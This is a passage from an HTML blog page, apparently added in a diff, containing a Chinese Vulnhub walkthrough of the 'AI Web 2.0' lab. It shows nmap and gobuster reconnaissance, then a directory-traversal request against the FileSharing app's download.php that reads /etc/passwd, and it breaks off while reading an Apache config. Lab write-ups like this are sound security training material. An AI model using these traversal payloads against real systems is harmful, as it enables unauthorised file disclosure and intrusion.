@@ -1,0 +1,591 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="打了很久最后又放弃打的靶场，最近无事捡起来重新打一遍"><title>AI Web 2.0 Vulunhub靶场复现-重走来时路4</title><link rel=canonical href=https://ke1thli.github.io/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="AI Web 2.0 Vulunhub靶场复现-重走来时路4"><meta property='og:description' content="打了很久最后又放弃打的靶场，最近无事捡起来重新打一遍"><meta property='og:url' content='https://ke1thli.github.io/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-08-07T00:00:00+00:00'><meta property='article:modified_time' content='2026-08-07T00:00:00+00:00'><meta name=twitter:title content="AI Web 2.0 Vulunhub靶场复现-重走来时路4"><meta name=twitter:description content="打了很久最后又放弃打的靶场，最近无事捡起来重新打一遍"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#靶场介绍>靶场介绍</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞探测>漏洞探测</a></li><li><a href=#目录爆破>目录爆破</a></li></ol></li><li><a href=#寻找漏洞和利用>寻找漏洞和利用</a><ol><li><a href=#寻找漏洞库>寻找漏洞库</a></li><li><a href=#漏洞利用>漏洞利用</a></li><li><a href=#john爆破>john爆破</a></li><li><a href=#账号登陆>账号登陆</a></li><li><a href=#利用命令执行漏洞>利用命令执行漏洞</a></li><li><a href=#存在隐藏文件>存在隐藏文件</a></li></ol></li><li><a href=#ssh登陆>SSH登陆</a></li><li><a href=#权限提升>权限提升</a><ol><li><a href=#提权向量lxd-容器逃逸>提权向量：LXD 容器逃逸</a></li></ol></li><li><a href=#root-权限获取>Root 权限获取</a></li><li><a href=#寻找flag>寻找flag</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/>AI Web 2.0 Vulunhub靶场复现-重走来时路4</a></h2><h3 class=article-subtitle>打了很久最后又放弃打的靶场，最近无事捡起来重新打一遍</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-07T00:00:00Z>Friday, August 7, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#靶场介绍>靶场介绍</a></li><li><a href=#信息收集>信息收集</a><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞探测>漏洞探测</a></li><li><a href=#目录爆破>目录爆破</a></li></ol></li><li><a href=#寻找漏洞和利用>寻找漏洞和利用</a><ol><li><a href=#寻找漏洞库>寻找漏洞库</a></li><li><a href=#漏洞利用>漏洞利用</a></li><li><a href=#john爆破>john爆破</a></li><li><a href=#账号登陆>账号登陆</a></li><li><a href=#利用命令执行漏洞>利用命令执行漏洞</a></li><li><a href=#存在隐藏文件>存在隐藏文件</a></li></ol></li><li><a href=#ssh登陆>SSH登陆</a></li><li><a href=#权限提升>权限提升</a><ol><li><a href=#提权向量lxd-容器逃逸>提权向量：LXD 容器逃逸</a></li></ol></li><li><a href=#root-权限获取>Root 权限获取</a></li><li><a href=#寻找flag>寻找flag</a></li></ol></nav></details></aside><section class=article-content><h1 id=ai-web-20-vulunhub靶场复现-重走来时路4>AI Web 2.0 Vulunhub靶场复现-重走来时路4</h1><h2 id=靶场介绍>靶场介绍</h2><p>靶场地址 <a class=link href=https://www.vulnhub.com/entry/ai-web-2%2C357/ target=_blank rel=noopener>https://www.vulnhub.com/entry/ai-web-2%2C357/</a></p><p>作者留下的话</p><p>Difficulty: Intermediate
+Network: DHCP (Automatically assign)
+Network Mode: NAT</p><p>This is the second box from the series AI: Web and you will have more fun to crack this challenge. The goal is simple. Get flag from /root/flag.txt. Enumerate the box, get low privileged shell and then escalate privilege to root.</p><p>You may need to crack password. Use wordlist SecLists/rockyou-45.txt by Mr. Daniel Miessler.</p><p>For any hint please tweet on @arif_xpress</p><h2 id=信息收集>信息收集</h2><h3 id=主机发现>主机发现</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap -sn 10.10.10.0/24
+</span></span></code></pre></td></tr></table></div></div><p>获取靶机ip为 10.10.10.134</p><h3 id=端口扫描>端口扫描</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sS -sV -O -p- -sC --min-rate <span class=m>5000</span> 10.10.10.134 -oN nmapscan/portscan.txt 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-08-06 20:03 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.134
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00061s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 95:51:c1:2e:6f:d8:03:e5:3e:e3:ca:d2:fa:d7:d4:e1 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> b9:8c:01:fd:12:f6:81:45:13:c3:80:23:26:74:39:4e <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> c1:6c:7e:ed:9d:7d:1b:b3:a9:cb:64:0f:04:d2:27:1a <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: File Manager <span class=o>(</span>Credit: XuezhuLi<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:68:94:46 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Linux 3.X<span class=p>|</span>4.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.14
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 11.98 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>版本</th><th>分析</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td><td>标准 SSH，版本不算特别老，暴力破解效率低，暂不作为优先入口。留作后续拿到凭据后的横向/登入通道。</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd</td><td>唯一攻击面。标题为 &ldquo;File Manager (Credit: XuezhuLi)"，说明这是一个文件管理器 Web 应用。</td></tr></tbody></table></div><h3 id=漏洞探测>漏洞探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo nmap --script<span class=o>=</span>vuln -p22,80 10.10.10.134 -oN nmapscan/vuln.txt
+</span></span></code></pre></td></tr></table></div></div><p>输出过长，这里我直接总结</p><ul><li><p>22/SSH：无漏洞脚本命中，版本 OpenSSH 7.6p1 较老但无明显 NSE 漏洞。</p></li><li><p>80/HTTP：</p><ul><li><p>发现 <strong>CSRF</strong> 提示（/、/index.php、/signup.php 有表单），但 CSRF 通常不是直接 RCE 入口。</p></li><li><p>/webadmin/ 目录存在且返回 401 Unauthorized** ——这是一个受保护的后台，值得重点突破。</p></li><li><p>XSS 扫描未命中。</p></li></ul></li></ul><h3 id=目录爆破>目录爆破</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>sudo gobuster dir -u 10.10.10.134 -w /usr/share/wordlists/dirb/common.txt
+</span></span></code></pre></td></tr></table></div></div><p>得到以下</p><p>.hta (Status: 403) [Size: 199]
+.htpasswd (Status: 403) [Size: 199]
+.htaccess (Status: 403) [Size: 199]
+css (Status: 301) [Size: 232] [&ndash;> http://10.10.10.134/css/]
+index.php (Status: 200) [Size: 678]
+server-status (Status: 403) [Size: 199]
+srv (Status: 301) [Size: 232] [&ndash;> http://10.10.10.134/srv/]
+webadmin (Status: 401) [Size: 381]</p><h2 id=寻找漏洞和利用>寻找漏洞和利用</h2><p>访问80端口只有一个Username的表单 分别有 登陆 和 注册两个按钮 这里我输入root 和admin 回显 不合法的用户名</p><p>用 Ke1th 注册了一个用户登陆进去，来到 10.10.10.134/userpage.php</p><p><img class=gallery-image data-flex-basis=530px data-flex-grow=220 height=869 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index1.png srcset="/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index1_hu_8bc953dc61f1bb2f.png 800w, /p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index1_hu_b0aa4de3e2f0183b.png 1600w, /p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index1.png 1920w" width=1920></p><p>根据搜索引擎对 Welcome to XuezhuLi FileSharing 这是一个github开源项目 地址为 <a class=link href=https://github.com/XuezhuLi/FileSharing target=_blank rel=noopener>https://github.com/XuezhuLi/FileSharing</a></p><p>查看这个网页的源码发现注释</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=c>&lt;!--	&lt;div class=&#34;upload&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=c>		&lt;form enctype=&#34;multipart/form-data&#34; action=&#34;/userpage.php&#34; method=&#34;POST&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=c>			&lt;input type=&#34;hidden&#34; name=&#34;MAX_FILE_SIZE&#34; value=&#34;1000000000&#34; /&gt;
+</span></span></span><span class=line><span class=cl><span class=c>			&lt;label for=&#34;uploadfile_input&#34;&gt;Choose a file to upload:&amp;nbsp;&amp;nbsp;&lt;/label&gt;&lt;input name=&#34;uploadedfile&#34; type=&#34;file&#34; id=&#34;uploadfile_input&#34;/&gt;
+</span></span></span><span class=line><span class=cl><span class=c>			&lt;button type=&#34;submit&#34; class = &#34;button&#34;&gt;Upload File&lt;/button&gt;
+</span></span></span><span class=line><span class=cl><span class=c>			&lt;span class=&#34;error&#34;&gt;&lt;/span&gt;
+</span></span></span><span class=line><span class=cl><span class=c>		&lt;/form&gt;
+</span></span></span><span class=line><span class=cl><span class=c>	&lt;/div&gt;
+</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>上传功能被注释掉了</p><p>想到之前爆出来个路径，访问一下</p><p><img class=gallery-image data-flex-basis=612px data-flex-grow=255 height=401 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index2.png srcset="/p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index2_hu_e9fa9278a8c9ea34.png 800w, /p/ai-web-2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0-%E9%87%8D%E8%B5%B0%E6%9D%A5%E6%97%B6%E8%B7%AF4/index2.png 1024w" width=1024></p><p>还是卡住了,发现我们没有找到立足点，既然这是开源项目，去漏洞库找找可能性</p><h3 id=寻找漏洞库>寻找漏洞库</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/AiWeb2<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ searchsploit XuezhuLi FileSharing
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th style=text-align:left>漏洞</th><th style=text-align:left>路径</th></tr></thead><tbody><tr><td style=text-align:left><strong>CSRF (Add User)</strong></td><td style=text-align:left><code>php/webapps/40010.html</code></td></tr><tr><td style=text-align:left><strong>Directory Traversal</strong></td><td style=text-align:left><code>php/webapps/40009.txt</code></td></tr></tbody></table></div><p>第1个漏洞是CSRF，危害不大，也不好利用，第2个是文件遍历，这个可以读取一些文件。</p><p>接着</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>searchsploit -x <span class=m>40009</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=漏洞利用>漏洞利用</h3><p>读取这个 nday 漏洞exp具体内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>Vulnerability 1 - download.php
+</span></span><span class=line><span class=cl>GET /vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd HTTP/1.1
+</span></span></code></pre></td></tr></table></div></div><p>这里我们直接把/download.php?file_name=../../../../../../../../../../../../../etc/passwd放到ip地址后面访问，也可以使用burpsuit抓包</p><p>下载并读取到了/etc/passwd文件内容如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lxd:x:105:65534::/var/lib/lxd/:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate:x:109:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>aiweb2:x:1000:1000::/home/aiweb2:/bin/bash
+</span></span><span class=line><span class=cl>n0nr00tuser:x:1001:1001::/home/n0nr00tuser:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>接着之前信息收集得到这是Apache系统，下载并读取读取到了 Apache 的虚拟主机配置文件看看</p><p>‘http://10.10.10.134/download.php?file_name=../../../../../../../../../etc/apache2/sites-enabled/000-default.conf’</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
